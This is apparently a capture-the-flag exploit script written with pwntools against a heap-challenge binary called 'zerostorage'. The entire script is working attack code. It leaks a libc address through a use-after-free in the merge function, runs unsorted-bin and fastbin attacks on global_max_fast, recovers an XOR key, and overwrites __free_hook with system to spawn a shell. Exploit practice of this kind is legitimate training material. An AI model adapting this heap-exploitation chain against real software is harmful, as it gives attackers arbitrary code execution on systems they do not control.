from pwn import *

p = process('./zerostorage')
context.log_level = 'debug'
libc = ELF('./libc.so')

def insert(length, data=''):
    data = data.ljust(length, 'A')
    p.recvuntil('Your choice: ')
    p.sendline('1')
    p.sendline(str(length))
    p.send(data)

def update(idx, length, data=''):
    data = data.ljust(length, 'B')
    p.recvuntil('Your choice: ')
    p.sendline('2')
    p.sendline(str(idx))
    p.sendline(str(length))
    p.send(data)

def merge(fro, to):
    p.recvuntil('Your choice: ')
    p.sendline('3')
    p.sendline(str(fro))
    p.sendline(str(to))

def delete(idx):
    p.recvuntil('Your choice: ')
    p.sendline('4')
    p.sendline(str(idx))

def view(idx):
    p.recvuntil('Your choice: ')
    p.sendline('5')
    p.recvuntil('Entry ID: ')
    p.sendline(str(idx))

elf_base = 0x555555554000

insert(0x8) #0 merge
insert(0x90,'/bin/sh;') #1
insert(0x8) #2
insert(0x90) #3 fake bss chunk
insert(0x80) #4 avoid top chunk

merge(0,0) #5
view(5)

# leak libc
p.recvuntil('Entry No.5:\n')
data = u64(p.recv(6).ljust(8,'\x00'))
log.success('leak main_area :'+hex(data))
libc_base = data - 0x3c4b78
global_max_fast = libc_base + 0x3c67f8
realloc_addr = libc_base + libc.symbols['__realloc_hook']
system_addr = libc_base + libc.symbols['system']
free_addr = libc_base + libc.symbols['__free_hook']

# unsortbin attack
payload = p64(global_max_fast - 0x10)*2
update(5,len(payload),payload)
insert(0x8) #0

# fastbin attack
merge(2,2) #6
payload2 = p64(elf_base + 0x203060 + 0x18 + 0x18 + 0x18)
update(6,len(payload2),payload2)
insert(0x8) #2
insert(0x88,'A'*0x50+p64(0x0)) #7

# leak after xor num --> get xor num
view(7)
p.recvuntil('\x88\x00\x00\x00\x00\x00\x00\x00')
data2 = u64(p.recv(8))
log.success('leak xor :'+hex(data2))
xor_num = data2^0x5555557570b8
log.success('xor num :'+hex(xor_num))

# change free_hook --> system
payload3 = p64(free_addr^xor_num)
update(7,0x88,payload3)

payload4 = p64(system_addr)
update(3,0x90,payload4)

delete(1)

p.interactive()
